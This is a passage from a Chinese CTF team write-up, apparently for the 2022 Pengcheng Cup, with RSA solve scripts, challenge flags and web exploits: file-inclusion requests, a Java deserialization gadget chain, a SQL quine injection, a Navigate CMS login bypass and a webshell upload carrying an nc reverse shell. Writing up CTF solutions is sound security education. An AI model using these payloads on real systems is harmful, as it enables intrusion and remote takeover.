class="comment">#_IO_flush_all_lockp</span></span><br><span class="line"><span class="comment">#_IO_str_overflow</span></span><br><span class="line"><span class="comment">#_IO_str_overflow + 120</span></span><br><span class="line"><span class="comment"># gdb.attach(r, &quot;b *(_IO_str_overflow + 120)&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sleep(1)</span></span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">&quot;&gt; \x00&quot;</span>, <span class="string">&quot;quit&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<h2><span id="crypto">crypto</span><a href="#crypto" class="header-anchor"></a></h2><h3><span id="easy-rsa">easy_rsa</span><a href="#easy-rsa" class="header-anchor"></a></h3><p>flag分成三部分了，第一部分e和phi不互素，所以求一下gcd(e,phi)，再解就行；</p>
<p>第二部分一元copper的p高位攻击，恢复p再求q；</p>
<p>第三部分c和n公因数就是p，直接求公因数解。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">​</span><br><span class="line">dic1 =  &#123;<span class="string">&#x27;c&#x27;</span>: <span class="string">&#x27;27455f081e4858790c6503580dad3302ae359c9fb46dc601eee98f05142128404e95377324720adbbdebf428549008bcd1b670f6749592a171b30316ab707004b9999f3b80de32843afdfd30505b1f4166a03cee9fc48902b74b6e850cfd268e6917c5d84e64f7e7cd0e4a30bfe5903fb5d821d27fdc817d9c4536a8e7aea55af266abcae857a8ffff2f741901baba1b44091a137c69c471c123ab0b80e250e055959c468e6e37c005105ecd7c8b48c659024e5e251df3eeff5da7b3d561cd98150da3575a16bee5f2524d2795fd4879487018345c1e96efc085ed45fb5f02c027aee5bca3aad0eb3e23376c0cd18b02fb05a1ff8fb1af0a3ce4bb671599894e&#x27;</span>, <span class="string">&#x27;p&#x27;</span>: <span class="string">&#x27;bb602e402b68a5cfcc5cfcc63cc82e362e98cb7043817e3421599a4bb8755777c362813742852dad4fec7ec33f1faec04926f0c253f56ab4c4dde6d71627fbc9ef42425b70e5ecd55314e744aa66653103b7d1ba86d1e0e21920a0bfe7d598bd09c3c377a3268928b953005450857c6cfea5bfdd7c16305baed0f0a31ad688bd&#x27;</span>, <span class="string">&#x27;q&#x27;</span>: <span class="string">&#x27;bb8d1ea24a3462ae6ec28e79f96a95770d726144afc95ffffa19c7c3a3786a6acc3309820ba7b1a28a4f111082e69e558b27405613e115139b38e799c723ab7fdd7be14b330b118ae60e3b44483a4c94a556e810ab94bbb102286d0100d7c20e7494e20e0c1030e016603bd2a06c1f6e92998ab68e2d420faf47f3ee687fb6d1&#x27;</span>, <span class="string">&#x27;e&#x27;</span>: <span class="string">&#x27;292&#x27;</span>&#125;</span><br><span class="line">dic2 =  &#123;<span class="string">&#x27;c&#x27;</span>: <span class="string">&#x27;3a80caebcee814e74a9d3d81b08b1130bed6edde2c0161799e1116ab837424fbc1a234b9765edfc47a9d634e1868105d4458c9b9a0d399b870adbaa2337ac62940ade08daa8a7492cdedf854d4d3a05705db3651211a1ec623a10bd60596e891ccc7b9364fbf2e306404aa2392f5598694dec0b8f7efc66e94e3f8a6f372d833941a2235ebf2fc77c163abcac274836380045b63cc9904d9b13c0935040eda6462b99dd01e8230fdfe2871124306e7bca5b356d16796351db37ec4e574137c926a4e07a2bfe76b9cbbfa4b5b010d678804df3e2f23b4ec42b8c8433fa4811bf1dc231855bea4225683529fad54a9b539fe824931b4fdafab67034e57338217f&#x27;</span>, <span class="string">&#x27;p&#x27;</span>: <span class="string">&#x27;a9cb9e2eb43f17ad6734356db18ad744600d0c19449fc62b25db7291f24c480217d60a7f87252d890b97a38cc6943740ac344233446eea4084c1ba7ea5b7cf2399d42650b2a3f0302bab81295abfd7cacf248de62d3c63482c5ea8ab6b25cdbebc83eae855c1d07a8cf0408c2b721e43c4ac53262bf9aaf7a000000000000000&#x27;</span>, <span class="string">&#x27;e&#x27;</span>: <span class="string">&#x27;10001&#x27;</span>, <span class="string">&#x27;n&#x27;</span>: <span class="string">&#x27;841a5a012c104e600eca17b451d5fd37c063ad347707a2e88f36a07e9ad4687302790466e99f35b11580cbe8b0a212e6709686c464a6393c5895b1f97885f23ea12d2069eb6dc3cb4199fb8c6e80a4a94561c6c3499c3c02d9dc9cf216c0f44dc91701a6d9ec89981f261a139500420a51014492f1da588a26e761439dd5739b32540ca6dc1ec3b035043bc535304a06ccb489f72fcd1aa856e1cffe195039176937f9a16bd19030d1e00095f1fd977cf4f23e47b55650ca4712d1eb089d92df032e5180d05311c938a44decc6070cd01af4c6144cdab2526e5cb919a1828bec6a4f3332bf1fa4f1c9d3516fbb158fd4fbcf8b0e67eff944efa97f5b24f9aa65&#x27;</span>&#125;</span><br><span class="line">dic3 =  &#123;<span class="string">&#x27;c&#x27;</span>: <span class="string">&#x27;1bd2a47a5d275ba6356e1e2bd10d6c870693be540e9318c746e807a7672f3a75cc63841170126d7dba52d7f6f9cf0f8dce9705fc1785cc670b2658b05d4b24d8918f95594844bfa920c8ffe73160c2c313b3fdbc4541ec19828165e34afa7d05271cc6fd59d08138b88c11677e6ac3b39cff525dcb19694b0388d895f53805a5e5bd8cfb947080e4855aaf83ebd85a397526f7d76d26031386900cb44a2e4bd121412bcee7a6c1e9af411e234f130e68a428596265d3ec647e50f65cb81393f4bd38389a2b9010fd715582506b9054dc235aced50757462b77a5606f116853af0c1ea3c7cf0d304f885d86081f8bac8b67b0625122f75448c5b6eb8f1cc8a0df&#x27;</span>, <span class="string">&#x27;n&#x27;</span>: <span class="string">&#x27;c2b17c86a8950f6dafe0a633890e4271cfb20c5ffda2d6b3d035afa655ed05ec16c67b18832ed887f2cea83056af079cc75c2ce43c90cce3ed02c2e07d256f240344f1734adeee6dc2b3b4bbf6dcfc68518d0a74e3e66f1865db95ef4204457e6471903c2321ac97f3b8e3d8d935896e9fc9145a30a3e24e7c320490a9944c1e94d301c8388445532699e6189f4aa6a86f67f1d9b8fb0de4225e005bd27594cd33e36622b2cd8eb2781f0c24d33267d9f29309158942b681aab81f39d1b4a73bd17431b46a89a0e4c2c58b1e24e850355c63b72392600d3fff7a16f6ef80ea515709da3ef1d28782882b0dd2f76bf609590db31979c5d1fd03f75d9d8f1c5069&#x27;</span>, <span class="string">&#x27;e&#x27;</span>: <span class="string">&#x27;10001&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">e1 = <span class="built_in">int</span>(dic1[<span class="string">&#x27;e&#x27;</span>],<span class="number">16</span>)</span><br><span class="line">c1 = <span class="built_in">int</span>(dic1[<span class="string">&#x27;c&#x27;</span>],<span class="number">16</span>)</span><br><span class="line">p1 = <span class="built_in">int</span>(dic1[<span class="string">&#x27;p&#x27;</span>],<span class="number">16</span>)</span><br><span class="line">q1 = <span class="built_in">int</span>(dic1[<span class="string">&#x27;q&#x27;</span>],<span class="number">16</span>)</span><br><span class="line">phi1 = (p1-<span class="number">1</span>)*(q1-<span class="number">1</span>)</span><br><span class="line">t = gcd(phi1,e1)</span><br><span class="line"></span><br><span class="line">d1 = invert(e1//t,phi1)</span><br><span class="line">m1 = long_to_bytes(iroot(<span class="built_in">pow</span>(c1,d1,p1*q1),t)[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">e2 = <span class="built_in">int</span>(dic2[<span class="string">&#x27;e&#x27;</span>],<span class="number">16</span>)</span><br><span class="line">ph = <span class="built_in">int</span>(dic2[<span class="string">&#x27;p&#x27;</span>],<span class="number">16</span>)</span><br><span class="line">n = <span class="built_in">int</span>(dic2[<span class="string">&#x27;n&#x27;</span>],<span class="number">16</span>)</span><br><span class="line">c2 = <span class="built_in">int</span>(dic2[<span class="string">&#x27;c&#x27;</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">p = <span class="number">119234372387564173916926418564504307771905987823894721284221707768770334474240277144999791051191061404002537779694672314673997030282474914206610847346023297970473719280866108677835517943804329212840618914863288766846702119011361533150365876285203805100986025166317939702179911918098037294325448226481818486521</span></span><br><span class="line">q = n//p</span><br><span class="line">phi2 = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d2 = invert(e2,phi2)</span><br><span class="line">m2 = long_to_bytes(<span class="built_in">pow</span>(c2,d2,n))</span><br><span class="line">​</span><br><span class="line">e3 = <span class="built_in">int</span>(dic3[<span class="string">&#x27;e&#x27;</span>],<span class="number">16</span>)</span><br><span class="line">c3 = <span class="built_in">int</span>(dic3[<span class="string">&#x27;c&#x27;</span>],<span class="number">16</span>)</span><br><span class="line">n3 = <span class="built_in">int</span>(dic3[<span class="string">&#x27;n&#x27;</span>],<span class="number">16</span>)</span><br><span class="line">gg = gcd(n3,c3)</span><br><span class="line">q3 = n3//gg</span><br><span class="line"></span><br><span class="line">phi3 = (gg-<span class="number">1</span>)*(q3-<span class="number">1</span>)</span><br><span class="line">d3 = invert(e3,phi3)</span><br><span class="line">M = <span class="built_in">pow</span>(c3,d3,n3)</span><br><span class="line"><span class="comment"># M = 2022 * m * 1011 * p</span></span><br><span class="line">m3 = M//<span class="number">2022</span>//gg//<span class="number">1011</span></span><br><span class="line">m3 = long_to_bytes(m3)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(m1+m2+m3)</span><br><span class="line"><span class="comment"># b&#x27;PCL&#123;16745c3b0c134c83b74f977260aae9b5&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 第二部分sage求p</span></span><br><span class="line">n = <span class="number">16676450704117406984592025063850900053789376003399190311720188158488886691280209555175830133393912861925677252847063707907536810656295135435030437243734401026617255634459734936796594942776689510859440558194110373664718925429745882204691083430639740384638701716026693412425164473472213091425769296148093070149231932577216369178892250824397978684233626964889041865056363294707998482306347934376164838745527260555009869036640749099896227929806275810818204261768115257353261726117067560402676352095817968864707164594118005516052080082446065707283304316695188972531988085450543617829295860842249432419321698844088907442789</span></span><br><span class="line">p_fake = <span class="number">119234372387564173916926418564504307771905987823894721284221707768770334474240277144999791051191061404002537779694672314673997030282474914206610847346023297970473719280866108677835517943804329212840618914863288766846702119011361533150365876285203805100986025166317939702179911918098037294324990096966084984832</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pbits = 2048</span></span><br><span class="line">pbits = p_fake.nbits()</span><br><span class="line"><span class="comment"># kbits = 900</span></span><br><span class="line">kbits = <span class="number">60</span>  <span class="comment"># p失去的低位</span></span><br><span class="line">pbar = p_fake &amp; (<span class="number">2</span> ^ pbits - <span class="number">2</span> ^ kbits)</span><br><span class="line"></span><br><span class="line">PR. &lt; x &gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = x + pbar</span><br><span class="line"></span><br><span class="line">x0 = f.small_roots(X=<span class="number">2</span> ^ kbits, beta=<span class="number">0.4</span>)[<span class="number">0</span>]  <span class="comment"># find root &lt; 2^kbits with factor &gt;= n^0.3</span></span><br><span class="line">p = x0 + pbar</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line">baby_rsa</span><br><span class="line">根据题目条件，<span class="number">2</span>^e=y(modn)，所以可以直接分解<span class="number">2</span>^e-y，得到比较大的就是p，大小在<span class="number">16</span>位附近的就是q；最后利用威尔逊定理处理一下模同余就行。</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">y=<span class="number">4513855932190587780512692251070948513905472536079140708186519998265613363916408288602023081671609336332823271976169443708346965729874135535872958782973382975364993581165018591335971709648749814573285241290480406050308656233944927823668976933579733318618949138978777831374262042028072274386196484449175052332019377</span></span><br><span class="line">e=<span class="number">1049</span></span><br><span class="line"><span class="comment">#print(2**e-y)</span></span><br><span class="line"><span class="comment">#6027543349128250261061611850906664728536346779212426641088428544963356731129810885082371555056594134371892601742424667721105193534249189043570046638983977639217990098126731016259348067349430430582215063864805103884037137420179826541116808264617091019826898653792245614592655285387965751855503038673696439312640921935</span></span><br><span class="line">​</span><br><span class="line">c=<span class="number">3303523331971096467930886326777599963627226774247658707743111351666869650815726173155008595010291772118253071226982001526457616278548388482820628617705073304972902604395335278436888382882457685710065067829657299760804647364231959804889954665450340608878490911738748836150745677968305248021749608323124958372559270</span></span><br><span class="line">p=<span class="number">170229264879724117919007372149468684565431232721075153274808454126426741324966131188484635914814926870341378228417496808202497615585946352638507704855332363766887139815236730403246238633855524068161116748612090155595549964229654262432946553891601975628848891407847198187453488358420350203927771308228162321231</span></span><br><span class="line">q=<span class="number">34211</span></span><br><span class="line">​</span><br><span class="line">n=p*q</span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line">cc=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line">k=gmpy2.invert(gmpy2.fac(q),p)</span><br><span class="line">m=cc*gmpy2.invert(k,p)%p</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment">#flag&#123;7h3_73rr1b13_7h1ng_15_7h47_7h3_p457_c4n&#x27;7_b3_70rn_0u7_by_175_r0075&#125;</span></span><br></pre></td></tr></table></figure>

<h3><span id="baby-rsa">baby_rsa</span><a href="#baby-rsa" class="header-anchor"></a></h3><p>根据题目条件，2^e&#x3D;y(modn)，所以可以直接分解2^e-y，得到比较大的就是p，大小在16位附近的就是q；最后利用威尔逊定理处理一下模同余就行。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line"></span><br><span class="line">y=4513855932190587780512692251070948513905472536079140708186519998265613363916408288602023081671609336332823271976169443708346965729874135535872958782973382975364993581165018591335971709648749814573285241290480406050308656233944927823668976933579733318618949138978777831374262042028072274386196484449175052332019377</span><br><span class="line">e=1049</span><br><span class="line">#print(2**e-y)</span><br><span class="line">#6027543349128250261061611850906664728536346779212426641088428544963356731129810885082371555056594134371892601742424667721105193534249189043570046638983977639217990098126731016259348067349430430582215063864805103884037137420179826541116808264617091019826898653792245614592655285387965751855503038673696439312640921935</span><br><span class="line">​</span><br><span class="line">c=3303523331971096467930886326777599963627226774247658707743111351666869650815726173155008595010291772118253071226982001526457616278548388482820628617705073304972902604395335278436888382882457685710065067829657299760804647364231959804889954665450340608878490911738748836150745677968305248021749608323124958372559270</span><br><span class="line">p=170229264879724117919007372149468684565431232721075153274808454126426741324966131188484635914814926870341378228417496808202497615585946352638507704855332363766887139815236730403246238633855524068161116748612090155595549964229654262432946553891601975628848891407847198187453488358420350203927771308228162321231</span><br><span class="line">q=34211</span><br><span class="line">​</span><br><span class="line">n=p*q</span><br><span class="line">phi=(p-1)*(q-1)</span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line">cc=pow(c,d,n)</span><br><span class="line">k=gmpy2.invert(gmpy2.fac(q),p)</span><br><span class="line">m=cc*gmpy2.invert(k,p)%p</span><br><span class="line">print(bytes.fromhex(hex(m)[2:]))</span><br><span class="line">#flag&#123;7h3_73rr1b13_7h1ng_15_7h47_7h3_p457_c4n&#x27;7_b3_70rn_0u7_by_175_r0075&#125;</span><br></pre></td></tr></table></figure>

<h2><span id="web">web</span><a href="#web" class="header-anchor"></a></h2><h3><span id="jian-dan-bao-han">简单包含</span><a href="#jian-dan-bao-han" class="header-anchor"></a></h3><p>多传一个文件 用 分块来传输 </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Content-type: multipart/form-data; boundary=--------------------------55split</span><br><span class="line">User-Agent: Firefox</span><br><span class="line">Accept: */*</span><br><span class="line">Host: 192.168.1.113</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 362</span><br><span class="line"> </span><br><span class="line">----------------------------55split</span><br><span class="line">Content-Disposition: form-data; name=&quot;&quot;; filename=&quot;1.py&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"> </span><br><span class="line">HWO</span><br><span class="line">----------------------------55split</span><br><span class="line">Content-Disposition: form-data; name=&quot;flag&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"> </span><br><span class="line">php://filter/read=convert.base64-encode/resource=flag.php</span><br><span class="line">----------------------------55split--</span><br></pre></td></tr></table></figure>

<p>拿到base64的php文件 解码就有</p>
<h3><span id="jian-dan-php">简单php</span><a href="#jian-dan-php" class="header-anchor"></a></h3><p>只能无参数执行，那么利用url取反加二维数组绕过,使用end(getallheaders())来取命令去执行</p>
<p><img src="../images/2022-pcb-SU-Writeup/image1.png"></p>
<p><img src="../images/2022-pcb-SU-Writeup/image2.png"></p>
<h3><span id="ez-java">Ez_java</span><a href="#ez-java" class="header-anchor"></a></h3><p>存在反序列化黑名单</p>
<p><img src="../images/2022-pcb-SU-Writeup/image3.png"></p>
<p>但是存在cb依赖</p>
<p><img src="../images/2022-pcb-SU-Writeup/image4.png" alt="1"></p>
<p>可以尝试调用SignedObject的getobject二次反序列化</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">final Object templates = Gadgets.createTemplatesImpl(command);</span><br><span class="line">// mock method name until armed</span><br><span class="line">final BeanComparator comparator = new BeanComparator(&quot;lowestSetBit&quot;);</span><br><span class="line"></span><br><span class="line">// create queue with numbers and basic comparator</span><br><span class="line">final PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, comparator);</span><br><span class="line">// stub data for replacement later</span><br><span class="line">queue.add(new BigInteger(&quot;1&quot;));</span><br><span class="line">queue.add(new BigInteger(&quot;1&quot;));</span><br><span class="line"></span><br><span class="line">// switch method called by comparator</span><br><span class="line">Reflections.setFieldValue(comparator, &quot;property&quot;, &quot;object&quot;);</span><br><span class="line"></span><br><span class="line">// switch contents of queue</span><br><span class="line">final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, &quot;queue&quot;);</span><br><span class="line"></span><br><span class="line">ConstantTransformer constant = new ConstantTransformer(String.class);</span><br><span class="line">// mock method name until armed</span><br><span class="line">Class[] paramTypes = new Class[] &#123; String.class &#125;;</span><br><span class="line">Object[] args = new Object[] &#123; &quot;foo&quot; &#125;;</span><br><span class="line">InstantiateTransformer instantiate = new InstantiateTransformer(</span><br><span class="line">    paramTypes, args);</span><br><span class="line"></span><br><span class="line">// grab defensively copied arrays</span><br><span class="line">paramTypes = (Class[]) Reflections.getFieldValue(instantiate, &quot;iParamTypes&quot;);</span><br><span class="line">args = (Object[]) Reflections.getFieldValue(instantiate, &quot;iArgs&quot;);</span><br><span class="line"></span><br><span class="line">ChainedTransformer chain = new ChainedTransformer(new Transformer[] &#123; constant, instantiate &#125;);</span><br><span class="line"></span><br><span class="line">// create queue with numbers</span><br><span class="line">PriorityQueue&lt;Object&gt; queue1 = new PriorityQueue&lt;Object&gt;(2, new TransformingComparator(chain));</span><br><span class="line">queue1.add(1);</span><br><span class="line">queue1.add(1);</span><br><span class="line"></span><br><span class="line">// swap in values to arm</span><br><span class="line">Reflections.setFieldValue(constant, &quot;iConstant&quot;, TrAXFilter.class);</span><br><span class="line">paramTypes[0] = Templates.class;</span><br><span class="line">args[0] = templates;</span><br><span class="line">KeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance(&quot;DSA&quot;);</span><br><span class="line">keyPairGenerator.initialize(1024);</span><br><span class="line">KeyPair keyPair = keyPairGenerator.genKeyPair();</span><br><span class="line">PrivateKey privateKey = keyPair.getPrivate();</span><br><span class="line">Signature signature = Signature.getInstance(privateKey.getAlgorithm());</span><br><span class="line">SignedObject signedObject = new SignedObject(queue1, privateKey, signature);</span><br><span class="line">queueArray[0] = signedObject;</span><br><span class="line">queueArray[1] = signedObject;</span><br><span class="line"></span><br><span class="line">return queue;</span><br></pre></td></tr></table></figure>

<p>再使用<a href="https://github.com/Y4er/ysoserial">https://github.com/Y4er/ysoserial</a> 打内存马直接命令执行获取flag</p>
<p><img src="../images/2022-pcb-SU-Writeup/image5.png"></p>
<p><img src="../images/2022-pcb-SU-Writeup/image6.png"></p>
<p>PCL{870bf708ae428c5da3191e69b4badf6a}</p>
<h3><span id="can-u-login">can_u_login</span><a href="#can-u-login" class="header-anchor"></a></h3><p>这里是一quine注入，要求输入和输出一样才行</p>
<p>参考2021的第五空间<a href="https://www.cnblogs.com/kingbridge/articles/15818673.html">https://www.cnblogs.com/kingbridge/articles/15818673.html</a></p>
<p>这里构造payload’&#x2F;<strong>&#x2F;union&#x2F;</strong>&#x2F;select(REPLACE(REPLACE(‘“&#x2F;<strong>&#x2F;union&#x2F;</strong>&#x2F;select(REPLACE(REPLACE(“!”,CHAR(34),CHAR(39)),CHAR(33),”!”))%23’,CHAR(34),CHAR(39)),CHAR(33),’”&#x2F;<strong>&#x2F;union&#x2F;</strong>&#x2F;select(REPLACE(REPLACE(“!”,CHAR(34),CHAR(39)),CHAR(33),”!”))%23’))%23</p>
<p>入让输入和输出一样</p>
<p><img src="../images/2022-pcb-SU-Writeup/image7.png"></p>
<p>绕过验证获取flag   PCL{7a7a24ec-9dc5-434e-b30c-92fe2df7d626}</p>
<h3><span id="gao-shou-gao-shou-gao-gao-shou">高手高手高高手</span><a href="#gao-shou-gao-shou-gao-gao-shou" class="header-anchor"></a></h3><p>dirsearch 扫描发现 .git 利用 githacker 下载源码</p>
<p>切到第一版本 发现是 navigate CMS  2.8 版本 具有多种漏洞. </p>
<p>可以 RCE</p>
<p>bypass 登陆</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /login.php HTTP/1.1</span><br><span class="line">Host: 192.168.1.116</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: navigate-user=\&#x27; or TRUE # ;</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>

<p>授权 RCE</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">POST /navigate_upload.php?session_id=5b62jp0rgrcqc8e337c0pnv7o4&amp;engine=picnik&amp;id=....//....//....//navigate_info.php HTTP/1.1</span><br><span class="line">Host: 192.168.1.116</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: navigate-tinymce-scroll=%7B%7D; navigate-language=en; NVSID_7da51544=5b62jp0rgrcqc8e337c0pnv7o4; </span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: multipart/form-data; boundary=--------------------------114514</span><br><span class="line">Content-Length: 352</span><br><span class="line"></span><br><span class="line">----------------------------114514</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;a.php&quot;</span><br><span class="line">Content-Type: application/x-httpd-php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">var_dump($_POST);</span><br><span class="line">system(&quot;ls -al&quot;);</span><br><span class="line">// # system(&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2&gt;&amp;1|nc 10.28.0.4 4443 &gt;/tmp/f&quot;);</span><br><span class="line">?&gt;</span><br><span class="line">----------------------------114514--</span><br></pre></td></tr></table></figure>

<p>用 注释中的内容 RCE 反弹 Shell 触发 RCE</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /navigate_info.php HTTP/1.1</span><br><span class="line">Host: 192.168.1.116</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: 